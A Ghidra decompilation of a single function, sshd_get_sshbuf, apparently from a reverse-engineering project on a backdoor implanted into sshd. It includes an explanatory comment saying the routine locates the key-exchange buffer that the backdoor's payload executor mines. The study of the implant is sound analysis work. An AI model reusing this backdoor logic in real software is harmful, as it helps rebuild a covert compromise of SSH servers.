// /home/kali/xzre-ghidra/xzregh/107A20_sshd_get_sshbuf.c
// Function: sshd_get_sshbuf @ 0x107A20
// Calling convention: unknown
// Prototype: undefined sshd_get_sshbuf(void)


/*
 * AutoDoc: Walks the cached monitor structure to locate the sshbuf that carries key-exchange data, falling back to heuristics if necessary. The payload executor calls it before mining modulus bytes from the session state.
 */
#include "xzre_types.h"


undefined1  [16] sshd_get_sshbuf(long *param_1,long param_2,ulong param_3,undefined8 param_4)

{
  undefined8 *puVar1;
  undefined1 auVar2 [16];
  int iVar3;
  ulong uVar4;
  ulong uVar5;
  long *plVar6;
  undefined8 *puVar7;
  long lVar8;
  uint uVar9;
  undefined1 auVar10 [16];
  
  if (param_1 == (long *)0x0) {
    auVar2._8_8_ = 0;
    auVar2._0_8_ = param_3;
    return auVar2 << 0x40;
  }
  if ((param_2 != 0) && (*(long *)(param_2 + 0x48) != 0)) {
    iVar3 = is_range_mapped(*(long *)(param_2 + 0x48),8,param_2);
    if (iVar3 != 0) {
      lVar8 = **(long **)(param_2 + 0x48);
      iVar3 = is_range_mapped(lVar8,0x20,param_2);
      if (iVar3 != 0) {
        plVar6 = *(long **)(lVar8 + 0x10);
        if (-1 < *(char *)(param_2 + 0x55)) {
          plVar6 = *(long **)(lVar8 + ((int)*(char *)(param_2 + 0x55) << 2));
        }
        lVar8 = 0x48;
        if (-1 < (char)(*(byte *)(param_2 + 0x56) & *(byte *)(param_2 + 0x57))) {
          uVar5 = (ulong)((int)(char)*(byte *)(param_2 + 0x57) << 3);
          uVar4 = (ulong)((int)(char)*(byte *)(param_2 + 0x56) << 3);
          lVar8 = uVar5 + 8;
          if (uVar5 < uVar4) {
            lVar8 = uVar4 + 8;
          }
        }
        iVar3 = is_range_mapped(plVar6,8,param_2);
        if (iVar3 != 0) {
          iVar3 = is_range_mapped(*plVar6,0x400,param_2);
          if (iVar3 != 0) {
            puVar7 = (undefined8 *)*plVar6;
            if (*(char *)(param_2 + 0x54) < '\0') {
              uVar9 = 0;
              puVar1 = puVar7 + 0x80;
              for (; puVar7 < puVar1; puVar7 = puVar7 + 1) {
                iVar3 = is_range_mapped(puVar7,lVar8,param_2);
                if (iVar3 != 0) {
                  iVar3 = sshbuf_extract(*puVar7,param_2,param_1,param_1 + 3);
                  if (iVar3 != 0) {
                    if (uVar9 < 2) {
                      iVar3 = get_string_id(*param_1,*param_1 + 7);
                      if ((iVar3 == 0x990) || (iVar3 == 0xd08)) {
                        uVar9 = uVar9 + 1;
                      }
                    }
                    else {
                      iVar3 = sshbuf_bignum_is_negative(param_1);
                      if (iVar3 != 0) {
                        uVar4 = 1;
                        goto LAB_00107ba8;
                      }
                    }
                  }
                }
              }
            }
            else {
              iVar3 = sshbuf_extract(*(undefined8 *)
                                      ((long)((int)*(char *)(param_2 + 0x54) << 3) + (long)puVar7),
                                     param_2,param_1,param_1 + 3);
              if (iVar3 != 0) {
                iVar3 = sshbuf_bignum_is_negative(param_1);
                uVar4 = (ulong)(iVar3 != 0);
                goto LAB_00107ba8;
              }
            }
          }
        }
      }
    }
  }
  uVar4 = 0;
LAB_00107ba8:
  auVar10._8_8_ = param_4;
  auVar10._0_8_ = uVar4;
  return auVar10;
}

